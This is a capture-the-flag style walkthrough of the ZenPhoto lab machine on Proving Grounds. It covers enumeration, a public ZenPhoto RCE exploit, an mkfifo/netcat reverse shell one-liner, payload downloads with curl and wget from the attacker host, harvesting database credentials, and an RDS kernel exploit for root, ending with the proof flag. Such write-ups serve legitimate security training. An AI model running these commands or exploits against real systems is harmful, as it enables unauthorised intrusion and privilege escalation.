---
title: "ZenPhoto - PG"
# author:
#   name: 0xKirito
#   link: https://github.com/0xKirito
date: 2022-01-15 23:02:44 +05:30
categories: [Writeups, Proving Grounds]
tags: [PG, ZenPhoto, RDS, Kernel Exploit]
render_with_liquid: false
---

## Recon & Enumeration

```bash
# autorecon
nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN full_tcp_nmap.txt 192.168.123.41
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 5.3p1 Debian 3ubuntu7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 83:92:ab:f2:b7:6e:27:08:7b:a9:b8:72:32:8c:cc:29 (DSA)
|_  2048 65:77:fa:50:fd:4d:9e:f1:67:e5:cc:0c:c6:96:f2:3e (RSA)
23/tcp   open  ipp     CUPS 1.4
|_http-server-header: CUPS/1.4
| http-methods: 
|   Supported Methods: GET HEAD OPTIONS POST PUT
|_  Potentially risky methods: PUT
|_http-title: 403 Forbidden
80/tcp   open  http    Apache httpd 2.2.14 ((Ubuntu))
|_http-server-header: Apache/2.2.14 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
3306/tcp open  mysql   MySQL (unauthorized)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.2.0 (95%), Linux 2.6.32 (93%), Linux 2.6.35 (93%)
```

### Ffuf 

```
ffuf -u http://192.168.123.41/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -c -t 40 

test  [Status: 301, Size: 315, Words: 20, Lines: 10]
```

- http://192.168.123.41/test/
- Powered by zenPHOTO 
- Google: zenphoto 
- https://github.com/zenphoto/zenphoto 
- This gives us the directory structure so now we can go through files and check for any files with sensitive information, version number, etc to aid in further enumeration 
- If we view the source for `http://192.168.123.41/test/` and search for version or scroll to the bottom, we see version number mentioned there 

```
<!-- zenphoto version 1.4.1.4 [8157] (Official Build) THEME: default (index.php) GRAPHICS LIB: PHP GD library 2.0 { memory: 128M } PLUGINS: class-video colorbox deprecated-functions hitcounter security-logger tiny_mce zenphoto_news zenphoto_sendmail zenphoto_seo  -->
```

- http://192.168.123.41/test/robots.txt

```
Disallow: /test/albums/
Disallow: /test/cache/
Disallow: /test/themes/
Disallow: /test/zp-core/
Disallow: /test/zp-data/
Disallow: /test/page/search/
Disallow: /test/uploaded/
```

---

## Exploitation

- `searchsploit zenphoto`
- [ZenPhoto 1.4.1.4 - 'ajax_create_folder.php' Remote Code Execution](https://www.exploit-db.com/exploits/18083) 
- `php 18083.php 192.168.123.41 /test/`
- `whoami => www-data`
- `curl 192.168.49.123/shell.php -o /var/www/test/shell.php`
- We do not have write access to the web root directory 
- This shell was very restricted so I got another proper reverse shell with netcat 
- `nc -lvnp 23` - since port 23 was also open on the target 
- Then run the following reverse shell one liner from the PHP shell we have: 

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.49.123 23 >/tmp/f
```

---

## Privilege Escalation 

- There is MySQL running on this machine as we know from our nmap scan so I started looking for files with MySQL credentials 
- `cat /var/www/test/zp-data/zp-config.php`

```php
# zp-data/zp-config.php
$conf['mysql_user'] = 'root';
$conf['mysql_pass'] = 'hola';
$conf['mysql_host'] = 'localhost';
$conf['mysql_database'] = 'zenphoto';
```

```sql
mysql> select id, user, name, pass from zp_administrators;
+----+----------------+----------+------------------------------------------+
| id | user           | name     | pass                                     |
+----+----------------+----------+------------------------------------------+
|  1 | administrators | group    | NULL                                     |
|  2 | viewers        | group    | NULL                                     |
|  3 | bozos          | group    | NULL                                     |
|  4 | album managers | template | NULL                                     |
|  5 | default        | template | NULL                                     |
|  6 | newuser        | template | NULL                                     |
|  7 | admin          | admin    | 63e5c2e178e611b692b526f8b6332317f2ff5513 |
+----+----------------+----------+------------------------------------------+
```

- Could not crack that hash so moved on to kernel exploits since this kernel version is really old 
- `uname -a => Linux offsecsrv 2.6.32-21-generic #32-Ubuntu SMP Fri Apr 16 08:10:02 UTC 2010 i686 GNU/Linux`
- LinPEAS suggested RDS kernel exploit and dirtycow 
- Reliable Datagram Sockets (RDS) Linux Privilege Escalation (Linux Kernel 2.6.30 < 2.6.36-rc8) 

```
Possible Exploits:
[+] [CVE-2010-3904] rds
   Details: http://www.securityfocus.com/archive/1/514379
   Exposure: highly probable
   Tags: debian=6.0{kernel:2.6.(31|32|34|35)-(1|trunk)-amd64},ubuntu=10.10|9.10,fedora=13{kernel:2.6.33.3-85.fc13.i686.PAE},[ ubuntu=10.04{kernel:2.6.32-(21|24)-generic} ]
   Download URL: http://web.archive.org/web/20101020044048/http://www.vsecurity.com/download/tools/linux-rds-exploit.c
```

- `wget 192.168.49.123/linux-rds-exploit.c -P /dev/shm/`

```
www-data@offsecsrv:/dev/shm$ gcc linux-rds-exploit.c -o rds-exploit
www-data@offsecsrv:/dev/shm$ chmod +x rds-exploit
www-data@offsecsrv:/dev/shm$ ./rds-exploit
[*] Linux kernel >= 2.6.30 RDS socket exploit
[*] by Dan Rosenberg
[*] Resolving kernel addresses...
 [+] Resolved rds_proto_ops to 0xf821d980
 [+] Resolved rds_ioctl to 0xf8217090
 [+] Resolved commit_creds to 0xc016dcc0
 [+] Resolved prepare_kernel_cred to 0xc016e000
[*] Overwriting function pointer...
[*] Triggering payload...
[*] Restoring function pointer...
[*] Got root!
# whoami
root
```

```
root@offsecsrv:/root# 
whoami && hostname && ifconfig | grep inet && cat proof.txt

root
offsecsrv
    inet addr:192.168.123.41  Bcast:192.168.123.255  Mask:255.255.255.0
    inet6 addr: fe80::250:56ff:feba:b881/64 Scope:Link
    inet addr:127.0.0.1  Mask:255.0.0.0
    inet6 addr: ::1/128 Scope:Host
4444cb0a0a33ab90abc85d121d2554
```

